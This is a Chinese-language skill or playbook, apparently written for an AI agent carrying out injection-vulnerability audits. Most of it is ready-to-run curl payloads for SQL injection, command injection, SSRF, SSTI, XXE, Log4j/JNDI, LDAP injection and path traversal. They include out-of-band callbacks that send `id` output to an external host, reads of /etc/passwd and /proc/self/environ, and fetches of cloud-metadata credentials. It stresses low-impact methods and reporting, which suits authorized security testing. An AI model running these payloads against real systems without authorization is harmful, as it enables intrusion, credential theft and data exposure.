---
name: injection-security-audit
description: 注入类漏洞检测与受控验证。SQL 注入、命令注入、SSRF、SSTI（模板注入）、XXE、LDAP 注入、NoSQL 注入、路径遍历、Log4j/JNDI。含基线对照与 OOB 回连验证。当任务目标是"打注入家族"时启用。
---
---
name: injection-security-audit
description: 注入漏洞检测。SQL/命令/SSRF/SSTI/XXE/LDAP/NoSQL/路径/Log4j，含基线对照与 OOB 回连。
---

# injection-security-audit — 注入漏洞检测

**核心原则**：
1. **基线对照**：每个疑似注入点先跑 baseline（无 payload），再跑 payload，对比响应差异。
2. **低影响验证**：不做大量数据 dump、不 drop 表、不发大量数据到攻击者服务器。
3. **OOB 回连**：优先用 OAST 域名（如 oastify / interactsh / 自建 DNS+HTTP）作无回显验证。

**依赖**：curl、python3、jq、openssl；可选 OAST（out-of-band）服务。

---

## 前置：OOB 服务

**优先用 oastify 或 interactsh**：

```bash
# oastify
curl -sS "https://api.oastify.com/public/v1/instance/create?name=pentest-$(date +%s)"
# 记下返回的 domain，例如 abc123.oastify.com
```

**自建备选**：

```bash
# HTTP 回连服务器
python3 -c "
from http.server import BaseHTTPRequestHandler,HTTPServer
class H(BaseHTTPRequestHandler):
  def do_GET(s):
    with open('evidence/http/callbacks.log','a') as f: f.write(f'{s.path}\n{s.headers}\n')
    s.send_response(200); s.end_headers()
  def log_message(s,*a): pass
HTTPServer(('0.0.0.0',8088),H).serve_forever()
" &
```

**OOB 域名列表**：`poc/oob.txt`（每行一个）。

---

## Phase 1 — 注入面扫描

### 1.1 目标分类

从 `recon/api_merged.txt` 或 `api_inventory.json` 抽所有参数：

```bash
# 抽所有 GET 参数
grep -oE '\?[a-zA-Z_]+=' recon/api_merged.txt | sort -u
# 抽所有 POST body 字段
jq -r '.params[]?.name' recon/api_inventory.json | sort -u
```

### 1.2 参数类型

| 类型 | 优先注入 |
|---|---|
| `id`, `uid`, `order_id`, `num`, `page_size` | SQL、LDAP、NoSQL |
| `name`, `q`, `search`, `keyword` | SQL、XSS、SSTI |
| `url`, `webhook`, `callback`, `redirect` | SSRF、开放重定向 |
| `cmd`, `exec`, `path`, `file` | 命令注入、路径遍历 |
| `tpl`, `template` | SSTI |
| `xml`, `doc` | XXE |
| `User-Agent`, `X-Forwarded-For`, `Host` | Log4j、SQL 头注入 |

---

## Phase 2 — SQL 注入

### 2.1 布尔盲注探测

```bash
# baseline
curl -sk "$BASE/api/user?id=1" -o evidence/http/sqli_b.json -w "%{http_code} %{size_download}\n"
# 单引号（是否报错）
curl -sk "$BASE/api/user?id=1'" -o evidence/http/sqli_q.json -w "%{http_code} %{size_download}\n"
# OR 1=1（是否总真）
curl -sk "$BASE/api/user?id=1%27%20OR%20%271%27%3D%271" -o evidence/http/sqli_or.json -w "%{http_code} %{size_download}\n"
# OR 1=2（是否总假）
curl -sk "$BASE/api/user?id=1%27%20OR%20%271%27%3D%272" -o evidence/http/sqli_orn.json -w "%{http_code} %{size_download}\n"
```

**判定**：
- `1'` 500 且 `1'--` 200 → 报错型 SQLi（Oracle/MySQL 差异）
- `OR '1'='1` 结果集 > `OR '1'='2` → 布尔盲注
- 无差异 → 可能是应用层过滤、参数化、或走不同路径

### 2.2 时间盲注

```bash
# MySQL
curl -sk "$BASE/api/user?id=1%27%20AND%20SLEEP(3)--" -o /dev/null -w "%{time_total}\n"
# PostgreSQL
curl -sk "$BASE/api/user?id=1%27%20AND%20pg_sleep(3)--" -o /dev/null -w "%{time_total}\n"
# MSSQL
curl -sk "$BASE/api/user?id=1;WAITFOR%20DELAY%20%270%3A0%3A3%27--" -o /dev/null -w "%{time_total}\n"
```

**判定**：baseline 100ms → payload 3000ms → 时间盲注 confirmed。

### 2.3 UNION 注入

```bash
# 探测列数
for n in 1 2 3 4 5 6 7 8 9 10; do
  col=$(python3 -c "print(','.join(['1']*$(($n-1))))")
  curl -sk "$BASE/api/user?id=-1%20UNION%20SELECT%20$col--" -o /dev/null -w "%{http_code} %{size_download}\n"
done
# 有 200 + 正常响应 → 列数找到
```

### 2.4 二阶注入

写入后回显时触发：
1. POST 用户名含 `'` 或 payload
2. 后续查询该用户时触发 SQL
3. 检查：`POST /user` with name=`'; DROP TABLE --`（**只做低影响**：用 `' OR 1=1 --`）

### 2.5 报错型特征

- MySQL：`SQL syntax`、`Unknown column`
- PostgreSQL：`pg_query`、`column "x" does not exist`
- MSSQL：`Unclosed quotation mark`、`Microsoft SQL Server`
- Oracle：`ORA-`、`invalid identifier`

响应含这些 → 报错型 SQLi confirmed。

### 2.6 低影响原则

- **不** `SELECT * FROM users` 全表拉
- **不** `DROP TABLE` / `DELETE`
- 只用 `SLEEP` 验证存在，不进一步 dump

---

## Phase 3 — 命令注入

### 3.1 探测点

参数名：`cmd`、`exec`、`command`、`shell`、`ping`、`ip`、`host`；Header：`User-Agent`、`X-Forwarded-For`。

### 3.2 Payload 矩阵（无害）

```bash
# 分号
curl -sk "$BASE/api/ping?host=127.0.0.1;id" -o evidence/http/cmdi_semi.txt
# 反引号
curl -sk "$BASE/api/ping?host=\`id\`" -o evidence/http/cmdi_tick.txt
# $( )
curl -sk "$BASE/api/ping?host=\$(id)" -o evidence/http/cmdi_dollar.txt
# | 
curl -sk "$BASE/api/ping?host=127.0.0.1|id" -o evidence/http/cmdi_pipe.txt
# 换行 %0a
curl -sk "$BASE/api/ping?host=127.0.0.1%0aid" -o evidence/http/cmdi_nl.txt
```

### 3.3 时间盲注（无回显）

```bash
# bash
curl -sk "$BASE/api/ping?host=127.0.0.1;sleep%203" -o /dev/null -w "%{time_total}\n"
```

### 3.4 OOB 验证

```bash
OAST="<oast-domain>"
curl -sk "$BASE/api/ping?host=\$(curl%20http://$OAST/\$(id))" -o /dev/null
# 检查 OAST 是否收到请求
```

**判定**：
- 响应含 `uid=0(root)` → 命令注入 confirmed
- 时间延迟 3 秒 → 命令注入 confirmed（盲）
- OAST 收到回连 → 命令注入 confirmed（盲）

### 3.5 低影响

- **不**用 `rm -rf`
- **不**用 `dd` 写磁盘
- **不**用反向 shell

---

## Phase 4 — SSRF

### 4.1 找端点

参数：`url`、`link`、`redirect`、`callback`、`webhook`、`webhook_url`、`target`、`remote`、`img`、`avatar`。

### 4.2 Payload 矩阵

```bash
OAST="<oast-domain>"
TARGET_IP="<目标 IP>"

# 云元数据
for meta in "http://169.254.169.254/latest/meta-data/" \
            "http://100.100.100.200/latest/meta-data/" \
            "http://metadata.google.internal/computeMetadata/v1/" \
            "http://169.254.169.254/latest/user-data"; do
  curl -sk -X POST -H @auth/headers_user.txt -H "Content-Type: application/json" \
    -d "{\"url\":\"$meta\"}" "$BASE/api/fetch" -o /dev/null -w "%{http_code}\n"
done

# 内网
curl -sk -X POST -H "Content-Type: application/json" -d "{\"url\":\"http://127.0.0.1:8080/\"}" "$BASE/api/fetch"
curl -sk -X POST -H "Content-Type: application/json" -d "{\"url\":\"http://192.168.1.1/\"}" "$BASE/api/fetch"
curl -sk -X POST -H "Content-Type: application/json" -d "{\"url\":\"http://10.0.0.1/\"}" "$BASE/api/fetch"

# DNS rebinding / IPv6
curl -sk -X POST -H "Content-Type: application/json" -d "{\"url\":\"http://[::1]/\"}" "$BASE/api/fetch"

# OOB
curl -sk -X POST -H "Content-Type: application/json" -d "{\"url\":\"http://$OAST/ssrf-test\"}" "$BASE/api/fetch"
```

### 4.3 SSRF 绕过

- URL 编码变体：`http%3A%2F%2F169.254.169.254`
- 十进制：`http://2852049966/`（=169.254.169.254）
- 十六进制：`http://0x28.0x28.0x28.0x28/`（=127.0.0.120）
- 302 跳转：URL 跳到 302 到内网
- URL 中 `@`：`http://evil.com@169.254.169.254/`
- 特殊字符：`http://0x7f.1/`、`http://127.1/`
- DNS rebinding：先解析到外网，再重绑定到内网

### 4.4 判定

- 响应内容含 `AWS_ACCESS_KEY`、`ami_id`、`role-arn` → 云凭据泄露（critical）
- 响应含 `localhost` 服务数据 → 内网信息泄露（high）
- OAST 收到回连 → SSRF confirmed（medium-high）
- 全部被拦 → OK

### 4.5 云元数据专项

**AWS**：`/latest/meta-data/iam/security-credentials/`
**GCP**：`/computeMetadata/v1/instance/service-account/default/token`（需 `Metadata-Flavor: Google`）
**阿里云**：`/latest/meta-data/ram/security-credentials/`

命中 → **critical**，立即停止进一步枚举（避免影响生产）；写 report_finding 后**通知用户**。

---

## Phase 5 — SSTI（服务端模板注入）

### 5.1 模板引擎识别

| 引擎 | 探测 payload |
|---|---|
| Jinja2 | `{{7*7}}`、`{{config}}`、`${7*7}`、`<%= 7*7 %>` |
| Freemarker | `${7*7}`、`<#assign a="x"/>` |
| Thymeleaf | `[[*{7+7}]]` |
| Velocity | `$7*$7`、`#set($x=1)$x` |
| ERB | `<%= 7*7 %>` |
| Handlebars | `{{7*7}}` |
| Twig | `{{7*7}}`、`{{1+1}}` |

### 5.2 探测流程

```bash
for tpl in '{{7*7}}' '\${7*7}' '<%= 7*7 %>' '<[#assign a=1]#assign b=1[#ftl]/' '[[*{7+7}]]' '\${7*7}'; do
  ENCODED=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$tpl'))")
  curl -sk "$BASE/api/search?q=$ENCODED" -o "evidence/http/ssti_$(echo $tpl | md5sum | head -c6).html" -w "%{http_code}\n"
done
# 检查响应中是否含 49
grep -l '49' evidence/http/ssti_*.html
```

### 5.3 深度探测

确认 SSTI 后，**低影响**：

```bash
# Jinja2: 读环境变量（不 dump 全部）
curl -sk "$BASE/api/search?q={{config.items()[:1]}}"
# Twig: 读变量
curl -sk "$BASE/api/search?q={{_self.env}} "
```

**禁止**：RCE payload、文件遍历读取系统文件（除非得到明确批准且已 backup）。

---

## Phase 6 — XXE（XML 外部实体）

### 6.1 找 XML 接口

路径含 `/xml` `/soap` `/rss` `/atom` `/feed`；Content-Type `application/xml`；参数名 `xml`、`doc`、`rss`。

### 6.2 Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

OOB：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://<oast-domain>/xxe">
]>
```

### 6.3 判定

- 响应含 `root:` → XXE confirmed（可文件读）
- OAST 收到回连 → 盲 XXE confirmed

---

## Phase 7 — Log4j / JNDI / LDAP 注入

### 7.1 Log4j 探测

```bash
OAST="<oast-domain>"
curl -sk -X POST -H "User-Agent: \${jndi:ldap://$OAST/log4j}" -H "Content-Type: application/json" -d '{}' "$BASE/api/test"
curl -sk -X POST -H "X-Api-Version: \${jndi:ldap://$OAST/x}" -d '{}' "$BASE/api/test"
curl -sk "$BASE/search?q=\${jndi:ldap://$OAST/q}"
```

### 7.2 判定

- OAST 收到 ldap/rdap/rmi 请求 → Log4j 类 JNDI 注入 confirmed
- 目标响应含 `java.lang.NoClassDefFoundError` 等 → 后端为 Java

### 7.3 LDAP 注入

```bash
# ldap query 参数含特殊字符
curl -sk "$BASE/api/ldap?q=admin%2A%29%28%26" -o /dev/null -w "%{http_code}\n"
```

---

## Phase 8 — 路径遍历 / LFI

### 8.1 常见端点

`?file=`、`?page=`、`?doc=`、`?template=`、`/download?path=`、`/preview?name=`。

### 8.2 Payload

```bash
curl -sk "$BASE/api/file?file=../../../../etc/passwd"
curl -sk "$BASE/api/file?file=..%2f..%2f..%2fetc%2fpasswd"
curl -sk "$BASE/api/file?file=....//....//etc/passwd"
curl -sk "$BASE/api/file?file=%252e%252e%252fetc%252fpasswd"
curl -sk "$BASE/api/file?file=/proc/self/environ"
curl -sk "$BASE/api/file?file=/var/log/sysmsg"
```

**Windows**：`..\..\..\windows\win.ini`

**低影响**：只试 `/etc/passwd`、`/etc/hosts`、`/etc/hostname`，**不**读 `/etc/shadow`、系统敏感文件。

### 8.3 PHP Filter（若识别为 PHP）

```bash
curl -sk "$BASE/api/file?file=php://filter/read=convert.base64-encode/resource=index.php"
```

---

## Phase 9 — 其他注入

- **LDAP**：见 7.3
- **NoSQL**：`{"key":"$ne","value":null}` 等 JSON 参数变体
- **XSS**：转 `web-security-audit`
- **CSV 注入**（Excel formula injection）：数据导出接口

---

## 报告规范

每条 finding 必须：
- 完整 curl 命令（可复制）
- baseline vs payload 响应长度差异 / 时间差异 / OOB 回连
- 数据库/语言识别（若适用）
- CVSS：SQLi / CMDi / SSRF→云凭据 critical；SSTI RCE critical；XXE 文件读 high
- 修复建议：参数化查询、白名单、WAF、输入验证、输出编码

---

## 完成标准

- [ ] SQLi：至少 3 种注入方式尝试（单引号、布尔、时间盲注）
- [ ] CMDi：至少 3 种 payload 变体 + OOB
- [ ] SSRF：至少云元数据 + 内网 + OOB 3 种
- [ ] SSTI：至少 5 种引擎 payload
- [ ] XXE：至少标准 + OOB
- [ ] Log4j：至少 3 个 header 变体
- [ ] 路径遍历：至少 5 种变体
- [ ] 每条命中即 report_finding；报告含 baseline vs payload 对比
- [ ] OAST 域名及时清理（测试完成后销毁 instance）
